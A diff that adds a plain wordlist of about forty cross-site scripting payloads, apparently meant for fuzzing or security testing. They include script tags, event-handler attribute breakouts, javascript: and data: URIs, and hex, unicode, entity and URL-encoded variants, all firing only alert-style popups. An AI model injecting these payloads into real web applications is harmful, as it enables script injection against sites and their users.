@@ -1,0 +1,42 @@
+javascript:alert(document.domain)
+data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+
+#"><img src=x onerror=alert(1)>
+#'><script>alert(1)</script>
+#<script>alert(1)</script>
+#javascript:alert(1)
+%23<script>alert(1)</script>
+%23javascript:alert(1)
+\"-alert(1)-\"
+'-alert(1)-'
+\';alert(1);//
+");alert(1);//
+\"+alert(1)+\"
+'+alert(1)+'
+\"-prompt(1)-\"
+"-confirm(1)-"
+)}alert(1);//
+})};alert(1);//
+</script><script>alert(1)</script>
+';eval(alert(1));//
+\x3cscript\x3ealert(1)\x3c/script\x3e
+\u003cscript\u003ealert(1)\u003c/script\u003e
+&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
+%3Cscript%3Ealert(1)%3C%2Fscript%3E
+&lt;script&gt;alert(1)&lt;/script&gt;
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+" onmouseover="alert(1)
+' onmouseover='alert(1)
+" onfocus="alert(1)" autofocus="
+' onfocus='alert(1)' autofocus='
+" onerror="alert(1)
+' onerror='alert(1)
+";alert(1)//
+';alert(1)//
+';alert(1);x='
+";alert(1);x="
+'-alert(1)-'x
+"-alert(1)-"x
+javascript:void(alert(1))
+javascript:void(0);alert(1)
+vbscript:msgbox(1)
